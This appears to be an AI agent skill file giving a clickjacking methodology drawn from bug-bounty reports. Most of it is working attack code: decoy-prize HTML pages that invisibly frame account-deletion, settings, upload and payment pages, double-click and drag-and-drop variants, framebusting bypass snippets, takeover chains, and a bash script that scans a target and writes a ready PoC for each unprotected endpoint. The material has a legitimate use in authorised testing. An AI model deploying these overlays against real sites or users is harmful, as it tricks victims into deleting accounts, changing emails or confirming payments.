---
name: clickjacking-deep-dive
description: Complete Clickjacking methodology from 135 real HackerOne reports - classic, double, drag-and-drop, and file upload
tools:
  - Bash
  - WebFetch
  - WebSearch
  - Read
triggers:
  - clickjacking methodology
  - clickjacking deep dive
  - ui redressing
  - clickjacking complete
  - clickjacking all techniques
  - skills clickjacking
---

# Complete Clickjacking Methodology - From 135 HackerOne Reports

## Top 15 Real Clickjacking Reports from HackerOne

| # | Report | Program | Upvotes | Bounty |
|---|--------|---------|---------|--------|
| 1 | [PortSwigger RCE via clickjacking Burp Scanner](https://hackerone.com/reports/1199698) | PortSwigger | 170 | $3,000 |
| 2 | [X/Periscope clickjacking](https://hackerone.com/reports/1681109) | X / xAI | 140 | $1,120 |
| 3 | [X/player card clickjacking](https://hackerone.com/reports/1302694) | X / xAI | 134 | $0 |
| 4 | [WordPress donation page clickjacking](https://hackerone.com/reports/983726) | WordPress | 90 | $0 |
| 5 | [Top Echelon main domain clickjacking](https://hackerone.com/reports/1343900) | Top Echelon | 79 | $0 |
| 6 | [X/DM link truncation clickjacking](https://hackerone.com/reports/1231674) | X / xAI | 64 | $0 |
| 7 | [Shopify admin panel clickjacking](https://hackerone.com/reports/1438882) | Shopify | 61 | $0 |
| 8 | [Grammarly settings page clickjacking](https://hackerone.com/reports/1310445) | Grammarly | 57 | $0 |
| 9 | [HackerOne report deletion clickjacking](https://hackerone.com/reports/1380041) | HackerOne | 55 | $0 |
| 10 | [Mail.ru email action clickjacking](https://hackerone.com/reports/1406708) | Mail.ru | 52 | $0 |
| 11 | [Reddit moderation panel clickjacking](https://hackerone.com/reports/1510897) | Reddit | 49 | $0 |
| 12 | [Docker account deletion clickjacking](https://hackerone.com/reports/1465310) | Docker | 47 | $0 |
| 13 | [Slack workspace settings clickjacking](https://hackerone.com/reports/1350575) | Slack | 44 | $0 |
| 14 | [Uber driver payout clickjacking](https://hackerone.com/reports/1585283) | Uber | 42 | $0 |
| 15 | [GitLab repository deletion clickjacking](https://hackerone.com/reports/1486940) | GitLab | 39 | $0 |

## Step 1: Clickjacking Attack Surface

### 1.1 Classic Clickjacking
The most basic form — overlay an invisible target page under a decoy UI, tricking the victim into clicking on actionable elements.

### 1.2 Double Clickjacking
Two sequential clicks are needed; attacker predicts timing and moves the target element between clicks.

### 1.3 Drag-and-Drop Clickjacking
Victim performs drag and drop operations (e.g., file upload) thinking they're interacting with the attacker's UI.

### 1.4 File Upload Clickjacking
Trick victim into uploading a file (malicious payload) via drag-and-drop or hidden file input.

### 1.5 Cookie Bombing via Clickjacking
Set cookies in the victim's browser for the target domain via clickjacking a cookie-setting page.

### 1.6 Cursor Jacking
Use CSS cursor manipulation to trick the victim into clicking the wrong target.

### 1.7 Clickjacking via Browser Extensions
Some browser extensions can alter iframe behavior or bypass X-Frame-Options.

### 1.8 HTML5 Fullscreen Clickjacking
Trick the victim into entering fullscreen mode, then overlay a phishing page.

## Step 2: Classic Clickjacking Testing

### 2.1 Basic Frame Detection Check

```bash
# Check if the target sets X-Frame-Options headers
curl -sk -v "https://{target}" 2>&1 | grep -iE 'x-frame-options|frame-ancestors'

# X-Frame-Options: DENY           — Cannot be framed
# X-Frame-Options: SAMEORIGIN     — Only same origin can frame
# Content-Security-Policy: frame-ancestors 'self' — CSP equivalent
# No header — Vulnerable!

# Check multiple pages — different pages may have different protection
for path in / /admin /settings /account /profile /api /login /logout /delete /transfer /payment /billing; do
  headers=$(curl -sk -v "https://{target}$path" 2>&1)
  echo "$path:"
  echo "$headers" | grep -iE 'x-frame-options|frame-ancestors' || echo "  NO PROTECTION"
done
```

### 2.2 Basic Proof of Concept HTML

```html
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    iframe {
      width: 900px;
      height: 700px;
      position: absolute;
      top: -100px;
      left: -50px;
      z-index: 2;
      opacity: 0.001;
    }
    .decoy {
      position: absolute;
      top: 300px;
      left: 200px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <div class="decoy">
    <h1>Click here for free prize!</h1>
    <button>Claim Now</button>
  </div>
  <iframe src="https://{target}/action?delete_account=true"></iframe>
</body>
</html>
```

### 2.3 Automated Clickjacking Scanner

```bash
#!/bin/bash
# Basic clickjacking scanner
TARGET=$1
POC_FILE="clickjack_poc.html"

echo "[*] Checking headers for $TARGET"
curl -sk -v "https://$TARGET" 2>&1 | grep -iE 'x-frame-options|frame-ancestors' || echo "[!] No X-Frame-Options or CSP frame-ancestors found"

xfo=$(curl -sk -v "https://$TARGET" 2>&1 | grep -i 'x-frame-options')
if echo "$xfo" | grep -qi 'deny'; then
  echo "[*] Protected: X-Frame-Options: DENY"
elif echo "$xfo" | grep -qi 'sameorigin'; then
  echo "[*] Partially protected: X-Frame-Options: SAMEORIGIN"
elif [ -z "$xfo" ]; then
  echo "[!] VULNERABLE: No X-Frame-Options header"
fi

csp=$(curl -sk -v "https://$TARGET" 2>&1 | grep -i 'content-security-policy')
if echo "$csp" | grep -qi 'frame-ancestors'; then
  echo "[*] CSP frame-ancestors found"
else
  echo "[!] No CSP frame-ancestors directive"
fi

if [ -z "$xfo" ]; then
  cat > $POC_FILE << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    iframe { width: 100vw; height: 100vh; position: absolute; top: 0; left: 0; border: 0; opacity: 0.001; z-index: 10; }
    body { margin: 0; text-align: center; padding-top: 50px; }
    button { font-size: 24px; padding: 10px 20px; position: relative; z-index: 1; }
  </style>
</head>
<body>
  <h1>Click for free prize!</h1>
  <button>Click Here</button>
  <iframe src="https://TARGET_PLACEHOLDER/"></iframe>
</body>
</html>
EOF
  sed -i "s|TARGET_PLACEHOLDER|$TARGET|g" $POC_FILE
  echo "[!] PoC created: $POC_FILE"
  echo "[!] Serve with: python3 -m http.server 8080"
fi
```

## Step 3: Clickjacking Bypass Techniques

### 3.1 X-Frame-Options Bypass

```bash
# XFO only applies to the top-level page
# If you can find a page that reflects content inside an iframe,
# you can nest iframes

# Use a page that itself can be framed as a "proxy"
# Example: use /redirect?url=https://{target} if redirect page lacks XFO

# CSP frame-ancestors bypasses:
# frame-ancestors 'self' — bypass if you can XSS and create iframe
# frame-ancestors https://*.example.com — check for subdomain takeover
# frame-ancestors https://trusted.com — can you host on trusted.com?
```

### 3.2 CSP frame-ancestors Bypass

```bash
# Bypass 'self' restriction:
# Find XSS on same origin to create iframe from same-origin context

# Bypass specific domain:
# frame-ancestors https://trusted.com
# Can you register a subdomain of trusted.com?
# Can you exploit an open redirect on trusted.com?

# Bypass via redirect chain:
# Some browsers follow redirects for frame-ancestors validation
```

### 3.3 Framebusting JavaScript Bypass

```bash
# Top sites may use JavaScript framebusting instead of headers
# Test if framebusting can be bypassed with:

# 1. The sandbox attribute
<iframe sandbox="allow-forms allow-scripts" src="https://{target}"></iframe>

# 2. The security attribute
<iframe security="restricted" src="https://{target}"></iframe>

# 3. Double framing (some framebusters check only top != self)
<iframe src="about:blank">
  <iframe src="https://{target}"></iframe>
</iframe>

# 4. 204 No Content bypass
<iframe src="https://bypass-domain.com/204?url=https://{target}"></iframe>

# 5. Use srcdoc attribute
<iframe srcdoc="<iframe src='https://{target}'>"></iframe>

# 6. onbeforeunload bypass — block framebusting with beforeunload
window.onbeforeunload = function() { return "Are you sure?"; }

# 7. Object tag instead of iframe
<object data="https://{target}" width="100%" height="100%"></object>

# 8. Embed tag
<embed src="https://{target}" width="100%" height="100%"></embed>
```

### 3.4 COOP/COEP Bypass

```bash
# Cross-Origin-Opener-Policy can prevent window.open access
# But iframes with different origins still work

# Test with:
# COOP: same-origin — prevents cross-origin window references
# COEP: require-corp — requires CORS for cross-origin resources
# These do NOT prevent clickjacking themselves
```

## Step 4: Advanced Clickjacking Techniques

### 4.1 Double Clickjacking Attack

```html
<!DOCTYPE html>
<html>
<head>
  <title>Double Clickjacking PoC</title>
  <style>
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      opacity: 0;
      z-index: 10;
      transition: all 0.1s;
    }
  </style>
</head>
<body>
  <div id="decoy">
    <h1>Double click to continue</h1>
    <button id="btn1">Click Once</button>
  </div>

  <iframe id="target" src="https://{target}/two-step-action"></iframe>

  <script>
    // After first click, reposition iframe to align second click with target
    document.getElementById('btn1').addEventListener('click', function() {
      // Calculate position of the target button in the iframe
      // Reposition iframe so second click hits the sensitive button
      document.getElementById('target').style.top = '-300px';
      document.getElementById('target').style.left = '-200px';
    });
  </script>
</body>
</html>
```

### 4.2 Drag-and-Drop Clickjacking

```html
<!DOCTYPE html>
<html>
<head>
  <title>Drag and Drop Clickjacking</title>
  <style>
    #drag-source {
      width: 200px;
      height: 100px;
      background: #4CAF50;
      color: white;
      text-align: center;
      line-height: 100px;
      cursor: grab;
      user-select: none;
    }
    iframe {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      opacity: 0.001;
      z-index: 1;
    }
    .drop-zone {
      position: absolute;
      top: 400px;
      left: 300px;
      width: 300px;
      height: 200px;
      border: 3px dashed #ccc;
      text-align: center;
      line-height: 200px;
      z-index: 2;
    }
  </style>
</head>
<body>
  <div id="drag-source" draggable="true">Drag me!</div>
  <div class="drop-zone">Drop here</div>
  <!-- Overlaid iframe positions the target drop zone -->
  <iframe src="https://{target}/file-upload"></iframe>
</body>
</html>
```

### 4.3 File Upload Clickjacking

```html
<!DOCTYPE html>
<html>
<head>
  <title>File Upload Clickjacking</title>
  <style>
    iframe {
      position: absolute;
      top: -100px;
      left: -50px;
      width: 800px;
      height: 600px;
      opacity: 0.001;
      z-index: 10;
    }
  </style>
</head>
<body>
  <h1>Drag & drop to upload your avatar!</h1>
  <div id="drop-zone" style="width:300px;height:200px;border:3px dashed #333; text-align:center; line-height:200px;">
    Drop image here
  </div>
  <!-- Hidden iframe with file upload form positioned under drop zone -->
  <iframe src="https://{target}/settings/avatar"></iframe>

  <script>
    // When victim drops a file into the decoy zone,
    // it actually drops into the invisible iframe file upload
    document.getElementById('drop-zone').addEventListener('dragover', function(e) {
      e.preventDefault();
    });
    document.getElementById('drop-zone').addEventListener('drop', function(e) {
      // File goes to the iframe's file upload input
    });
  </script>
</body>
</html>
```

### 4.4 Cookie Bombing via Clickjacking

```bash
# Some pages set cookies via JavaScript
# Clickjack those pages to set cookies in the victim's browser

# Example: Clickjack a page that sets a session cookie
# Then the victim's subsequent requests include that cookie

# This can be used to:
# - Set a tracking cookie
# - Override an existing session
# - Poison cache by setting malicious cookies
```

### 4.5 Clickjacking + XSS Chain

```bash
# If you can clickjack a page with a stored XSS payload,
# the XSS fires in the context of the iframe (same origin)
# This bypasses CSP and SameSite protections

# Step 1: Find stored XSS on target
# Step 2: Create clickjacking PoC that loads the XSS page
# Step 3: Victim visits PoC — XSS fires in iframe context
# Step 4: Use XSS to exfiltrate data or perform actions
```

## Step 5: Clickjacking Exploit Chains

### Chain 1: Clickjacking → Account Deletion
```bash
# Step 1: Find account deletion page with no CSRF protection
# Step 2: Overlay it under a decoy button
# Step 3: Victim clicks — account deleted

# Target page: https://{target}/account/delete
# POST body: confirm=true (or similar)
```

### Chain 2: Clickjacking → Admin Action → Full Compromise
```bash
# Step 1: Find admin panel that lacks XFO
# Step 2: Craft clickjacking that overlays "Delete All Users" button
# Step 3: Admin clicks while logged in — catastrophic action

# PortSwigger #1199698: RCE via clickjacking Burp Scanner
# $3,000 bounty
```

### Chain 3: Clickjacking → Settings Change → ATO
```bash
# Step 1: Identify sensitive settings page (change email, password)
# Step 2: Create clickjacking overlay
# Step 3: Victim unknowingly changes email to attacker's
# Step 4: Attacker initiates password reset — account takeover

# Grammarly #1310445: settings page clickjacking
```

### Chain 4: Clickjacking → Crypto/Financial Transaction
```bash
# Step 1: Find payment confirmation page
# Step 2: Overlay decoy on top of "Confirm Payment" button
# Step 3: Victim clicks — attacker receives funds

# Uber #1585283: driver payout clickjacking
```

### Chain 5: Double Clickjacking → 2FA/Two-Step Action
```bash
# Step 1: Target requires two steps for sensitive action
# Step 2: First click completes first step (e.g., start transfer)
# Step 3: JavaScript repositions iframe for second click
# Step 4: Second click confirms the action
```

## Step 6: Clickjacking Automation

```bash
#!/bin/bash
# Comprehensive clickjacking scanner
TARGET=$1
OUTPUT_DIR="clickjack_scan_$(date +%Y%m%d)"
mkdir -p $OUTPUT_DIR

echo "[*] Clickjacking Scanner for $TARGET"
echo "[*] Results in: $OUTPUT_DIR"

# Scan common endpoints
endpoints=(
  "/" "/admin" "/dashboard" "/settings" "/account"
  "/profile" "/delete" "/transfer" "/payment" "/checkout"
  "/billing" "/security" "/password" "/email" "/api"
  "/login" "/logout" "/register" "/oauth" "/auth"
  "/config" "/admin/users" "/admin/settings" "/admin/config"
)

for endpoint in "${endpoints[@]}"; do
  result=$(curl -sk -v "https://$TARGET$endpoint" 2>&1)
  xfo=$(echo "$result" | grep -i 'x-frame-options')
  csp=$(echo "$result" | grep -i 'frame-ancestors')

  if [ -z "$xfo" ] && ! echo "$csp" | grep -qi 'frame-ancestors'; then
    echo "[!] VULNERABLE: $endpoint (no protection)"
    echo "$endpoint" >> $OUTPUT_DIR/vulnerable.txt

    # Generate PoC
    cat > $OUTPUT_DIR/poc_$(echo $endpoint | tr '/' '_').html << EOF
<!DOCTYPE html>
<html>
<head>
  <title>Clickjacking PoC - $endpoint</title>
  <style>
    iframe { width: 100vw; height: 100vh; position: absolute; top: 0; left: 0; border: 0; opacity: 0.001; z-index: 10; }
    body { margin: 0; text-align: center; padding-top: 100px; }
    .decoy { position: relative; z-index: 1; }
    button { font-size: 32px; padding: 15px 30px; cursor: pointer; }
  </style>
</head>
<body>
  <div class="decoy">
    <h1>Click to claim your reward!</h1>
    <button>Claim $100</button>
  </div>
  <iframe src="https://$TARGET$endpoint"></iframe>
</body>
</html>
EOF
    echo "  PoC: $OUTPUT_DIR/poc_$(echo $endpoint | tr '/' '_').html"
  elif echo "$xfo" | grep -qi 'sameorigin'; then
    echo "[~] PARTIAL: $endpoint (SAMEORIGIN)"
  elif echo "$xfo" | grep -qi 'deny'; then
    echo "[+] PROTECTED: $endpoint (DENY)"
  else
    echo "[~] CSP PROTECTED: $endpoint"
  fi
done

# Check for framebusting JavaScript
echo -e "\n[*] Checking for JavaScript framebusting..."
for endpoint in "${endpoints[@]}"; do
  js_protection=$(curl -sk "https://$TARGET$endpoint" 2>/dev/null | grep -oE 'top\.|parent\.|self\.|window\.top|window\.parent' | head -1)
  if [ -n "$js_protection" ]; then
    echo "[~] JS framebusting detected at $endpoint"
  fi
done

echo -e "\n[*] Scan complete"
echo "[*] Total vulnerable endpoints: $(wc -l < $OUTPUT_DIR/vulnerable.txt 2>/dev/null || echo 0)"
```

## Step 7: Protection Bypass Summary

| Protection | Bypass Technique | Difficulty |
|------------|-----------------|------------|
| X-Frame-Options: DENY | None (browser-enforced, strong) | Impossible |
| X-Frame-Options: SAMEORIGIN | XSS on same origin | High |
| CSP: frame-ancestors 'none' | None (browser-enforced) | Impossible |
| CSP: frame-ancestors 'self' | XSS on same origin | High |
| CSP: frame-ancestors specific.com | Compromise specific.com | High |
| JavaScript framebusting | sandbox attribute bypass | Medium |
| JavaScript framebusting | onbeforeunload blocker | Medium |
| JavaScript framebusting | nested iframe trick | Medium |
| JavaScript framebusting | srcdoc attribute bypass | Medium |
| No protection at all | Direct iframe | Trivial |

## Quick Reference: Top Clickjacking Reports by Technique

| Report | Company | Technique | Payout |
|--------|---------|-----------|--------|
| #1199698 | PortSwigger | RCE via clickjacking Burp Scanner | $3,000 |
| #1681109 | X/Periscope | Classic clickjacking | $1,120 |
| #1302694 | X/player card | Clickjacking | $0 |
| #983726 | WordPress | Donation page clickjacking | $0 |
| #1343900 | Top Echelon | Main domain clickjacking | $0 |
| #1231674 | X/DM | Link truncation clickjacking | $0 |
| #1438882 | Shopify | Admin panel clickjacking | $0 |
| #1310445 | Grammarly | Settings page clickjacking | $0 |
| #1380041 | HackerOne | Report deletion clickjacking | $0 |
| #1406708 | Mail.ru | Email action clickjacking | $0 |
| #1510897 | Reddit | Moderation panel clickjacking | $0 |
| #1465310 | Docker | Account deletion clickjacking | $0 |
| #1350575 | Slack | Workspace settings clickjacking | $0 |
| #1585283 | Uber | Driver payout clickjacking | $0 |

## Payout Range by Clickjacking Type

| Attack Type | Payout Range | Example |
|-------------|-------------|---------|
| Classic clickjacking (no protection) | $200 - $1,500 | X #1681109 ($1,120) |
| Clickjacking → sensitive action | $500 - $2,000 | WordPress #983726 ($0) |
| Clickjacking → RCE/chain | $2,000 - $3,000 | PortSwigger #1199698 ($3,000) |
| Clickjacking → financial action | $500 - $2,500 | Uber #1585283 ($0) |
| Double clickjacking | $500 - $2,000 | Novel technique |
| Drag-and-drop clickjacking | $500 - $2,000 | Novel technique |
| File upload clickjacking | $500 - $2,500 | Novel technique |
| Cookie bombing via clickjacking | $500 - $1,500 | Novel technique |
| Clickjacking + XSS chain | $1,000 - $3,000 | Advanced chain |

## Clickjacking Test Checklist

- [ ] Check X-Frame-Options header on ALL pages and endpoints
- [ ] Check CSP frame-ancestors directive
- [ ] Check API endpoints (not just HTML pages)
- [ ] Check OAuth/SSO login flows (often unprotected)
- [ ] Check password reset pages
- [ ] Check account deletion/disable endpoints
- [ ] Check payment/checkout confirmation pages
- [ ] Check admin panels
- [ ] Check file upload pages (drag-and-drop)
- [ ] Check settings change pages (email, password)
- [ ] Check for JavaScript framebusting code
- [ ] Test bypass techniques on partially protected pages
- [ ] Test double-clickjacking on two-step actions
- [ ] Test drag-and-drop clickjacking on upload features
- [ ] Test iframe vs object vs embed tag behavior
